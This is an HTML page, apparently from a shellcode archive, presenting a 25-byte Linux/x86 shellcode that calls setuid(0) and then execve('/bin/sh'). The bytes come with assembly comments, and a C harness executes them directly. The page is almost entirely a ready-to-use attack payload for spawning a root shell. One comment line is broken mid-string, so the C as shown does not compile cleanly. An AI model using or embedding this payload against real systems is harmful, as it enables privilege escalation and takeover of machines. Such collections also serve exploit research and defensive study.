<html><head><title>Linux/x86 - setuid(0) &amp; execve(/bin/sh,0) - 25 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;

const char shellcode[]=
	&quot;\x6a\x17&quot;		// push	$0x17
	&quot;\x58&quot;			// pop	%eax
	&quot;\x31\xdb&quot;		// xor	%ebx,%ebx
	&quot;\xcd\x80&quot;		// int	$0x80

	&quot;\xb0\x0b&quot;		// mov	$0xb,%al (So you'll get segfault   if it's not able
to do the setuid(0). If you don't want this you can write &quot;\x6a\x0b\x58&quot;
instead of &quot;\xb0\x0b&quot;, but the shellcode will be 1 byte longer
	&quot;\x99&quot;			// cltd
	&quot;\x52&quot;			// push	%edx
	&quot;\x68\x2f\x2f\x73\x68&quot;	// push	$0x68732f2f
	&quot;\x68\x2f\x62\x69\x6e&quot;	// push	$0x6e69622f
	&quot;\x89\xe3&quot;		// mov	%esp,%ebx
	&quot;\xcd\x80&quot;;		// int	$0x80

int main()
{
	printf	(&quot;\n[+] Linux/x86 setuid(0) &amp; execve(/bin/sh,0)&quot;
		&quot;\n[+] Date: 23/06/2009&quot;
		&quot;\n[+] Author: TheWorm&quot;
		&quot;\n\n[+] Shellcode Size: %d bytes\n\n&quot;, sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
